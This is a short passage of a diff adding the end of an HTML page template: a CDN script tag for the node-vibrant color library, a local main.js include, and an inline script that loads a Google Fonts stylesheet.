+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
